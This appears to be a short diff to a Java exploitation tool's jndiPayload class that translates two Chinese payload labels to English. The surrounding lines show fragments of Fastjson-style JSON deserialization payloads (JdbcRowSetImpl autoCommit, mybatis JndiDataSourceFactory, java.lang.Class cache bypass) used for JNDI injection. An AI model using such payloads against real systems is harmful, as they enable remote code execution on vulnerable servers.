@@ -13,7 +13,7 @@ public class jndiPayload extends Payload {
             "           \"autoCommit\":true\n" +
             "       }\n" +
             "   }\n" +
-            "[+] JdbcRowSetImpl 缓存绕过 \n" +
+            "[+] JdbcRowSetImpl (cache bypass) \n" +
             "   {\n" +
             "       \"fw1\":{\n" +
             "           \"@type\":\"java.lang.Class\",\n" +
@@ -33,7 +33,7 @@ public class jndiPayload extends Payload {
             "           }\n" +
             "       }\n" +
             "   }\n"+
-            "[+] mybatis JndiDataSourceFactory 缓存绕过\n" +
+            "[+] mybatis JndiDataSourceFactory (cache bypass)\n" +
             "   {\n" +
             "       \"fw1\":{\n" +
             "           \"@type\":\"java.lang.Class\",\n" +
